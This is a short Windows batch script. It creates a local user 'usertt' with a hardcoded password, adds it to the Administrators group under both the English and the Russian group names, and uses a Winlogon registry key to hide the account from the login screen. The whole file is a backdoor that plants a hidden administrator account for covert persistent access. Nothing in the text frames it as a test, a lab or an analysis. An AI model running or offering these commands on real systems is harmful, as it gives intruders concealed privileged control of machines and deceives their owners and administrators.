chcp 65001
net user usertt WedtjR10h /add
net localgroup administrators usertt /add
net localgroup Администраторы usertt/add
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v usertt /t REG_DWORD /d 0
